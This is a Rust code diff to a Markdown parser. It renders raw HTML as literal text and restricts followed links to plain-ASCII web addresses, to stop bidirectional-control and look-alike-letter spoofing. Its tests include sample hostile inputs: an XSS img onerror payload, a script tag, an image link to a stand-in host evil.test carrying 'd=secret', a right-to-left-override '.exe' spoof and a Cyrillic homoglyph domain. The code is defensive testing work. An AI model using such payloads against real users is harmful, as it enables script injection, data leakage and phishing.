@@ -212,8 +212,14 @@ pub fn parse(source: &str) -> Vec<Block> {
                     links: Vec::new(),
                 });
             }
-            // Raw HTML is never drawn; images are their alt text (Text events).
-            Event::Html(_) | Event::InlineHtml(_) => {}
+            // Raw HTML is never interpreted: it shows as the text it is.
+            // Images are their alt text (Text events).
+            Event::Html(html) => {
+                b.flush();
+                b.text(html.trim_end());
+                b.flush();
+            }
+            Event::InlineHtml(html) => b.text(&html),
             _ => {}
         }
     }
@@ -228,12 +234,17 @@ pub fn parse(source: &str) -> Vec<Block> {
     b.blocks
 }
 
+/// The longest address a link may have (the launcher refuses more).
+const MAX_URL: usize = 1000;
+
 /// Only web links are followed (and only after the user confirms them).
+/// The address is plain ASCII: a bidirectional control or a look-alike letter
+/// would make the confirmation show another address than the one opened.
 pub fn is_web(url: &str) -> bool {
     let lower = url.get(..8).unwrap_or(url).to_ascii_lowercase();
     (lower.starts_with("https://") || lower.starts_with("http://"))
-        && !url.chars().any(|c| c.is_control() || c.is_whitespace())
-        && url.len() <= 2000
+        && url.bytes().all(|c| c.is_ascii_graphic())
+        && url.len() <= MAX_URL
 }
 
 #[cfg(test)]
@@ -305,21 +316,28 @@ mod tests {
         assert!(!is_web("https://a b"));
         assert!(!is_web("ftp://x"));
         assert!(is_web("HTTP://X.org"));
+        // Bidi controls, look-alike letters and over-long addresses.
+        assert!(!is_web("https://example.org/\u{202e}gpj.exe"));
+        assert!(!is_web("https://\u{430}pple.com/"));
+        assert!(!is_web(&format!("https://x.org/{}", "a".repeat(1000))));
     }
 
     #[test]
-    fn raw_html_and_images_are_not_drawn() {
-        let blocks = parse("<img src=x onerror=alert(1)>\n\n![alt text](https://evil.test/p.png?d=secret)\n\n<script>bad()</script>");
+    fn raw_html_is_text_and_images_are_their_alt_text() {
+        let blocks = parse("<img src=x onerror=alert(1)>\n\n![alt text](https://evil.test/p.png?d=secret)\n\n<script>bad()</script>\n\nA `Vec<String>` and <b>bold</b>.");
+        // Nothing is interpreted: no link, no picture.
+        assert!(blocks.iter().all(|b| b.links.is_empty()));
         let all: String = blocks
             .iter()
             .map(|b| b.text.as_str())
             .collect::<Vec<_>>()
             .join("|");
-        assert!(
-            !all.contains("onerror") && !all.contains("script") && !all.contains("evil.test"),
-            "{all}"
-        );
+        assert!(!all.contains("evil.test"), "{all}");
         assert!(all.contains("alt text"));
+        // The markup is shown as written.
+        assert!(all.contains("<script>bad()</script>"), "{all}");
+        assert!(all.contains("<b>bold</b>"), "{all}");
+        assert!(all.contains("Vec<String>"), "{all}");
     }
 
     #[test]
